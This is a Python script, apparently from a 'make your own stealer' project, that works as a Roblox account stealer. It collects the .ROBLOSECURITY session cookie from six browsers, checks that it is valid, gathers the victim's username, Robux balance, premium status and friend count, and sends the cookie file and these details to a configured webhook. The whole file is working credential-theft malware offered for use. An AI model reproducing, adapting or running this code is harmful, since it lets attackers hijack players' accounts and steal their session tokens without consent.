import requests, robloxpy, json, browser_cookie3, os.path
from configs import hook

user = os.path.expanduser("~")


def robloxl():
    data = [] 

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')    
        for cookie in cookies:
            print(cookie)
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')    
        for cookie in cookies:
            print(cookie)
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                print("L")
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
cookiesrbx = robloxl()

def rbxsteal():
 roblox_cookie = cookiesrbx[1]
 isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 if isvalid == "Valid Cookie":
    isvalid = "Valid"
 else:
  exit()
 ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
 info = json.loads(ebruh.text)
 rid = info["UserID"]
 rap = robloxpy.User.External.GetRAP(rid)
 friends = robloxpy.User.Friends.External.GetCount(rid)
 age = robloxpy.User.External.GetAge(rid)
 dnso = None
 crdate = robloxpy.User.External.CreationDate(rid)
 rolimons = f"https://www.rolimons.com/player/{rid}"
 roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
 headshot = robloxpy.User.External.GetHeadshot(rid)
 limiteds = robloxpy.User.External.GetLimiteds(rid)

 username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium']
 result = open(user + "\\AppData\\Local\\Temp\\cookierbx.txt", "w")
 result.write(cookiesrbx[1])
 result.close()
 payload = {
    "embeds": [
        {
            "title": "Roblox Stealer!",
            "description": "Github.com/Lawxsz/make-u-own-stealer",
            "fields": [
         {
             "name": "Username",
             "value": username,
             "inline": True
         },
         {
             "name": "Robux Balance",
             "value": robux,
             "inline": True
         },
         {
             "name": "Premium",
             "value": premium,
             "inline": True
         },
         {
             "name": "Builders Club",
             "value": info["IsAnyBuildersClubMember"],
             "inline": True
         },
         {
             "name": "Friends",
             "value": friends,
             "inline": True
         },
         {
             "name": "Profile",
             "value": roblox_profile,
             "inline": True
         },
         {
             "name": "Age",
             "value": crdate,
             "inline": True
         },
            ]
        }
    ]
}
 
 headers = {
    'Content-Type': 'application/json'
}
 file = {"file": open(user+f"\\AppData\\Local\\Temp\\cookierbx.txt", 'rb')}

 r = requests.post(hook, data=json.dumps(payload), headers=headers)
 fil = requests.post(hook, files=file)

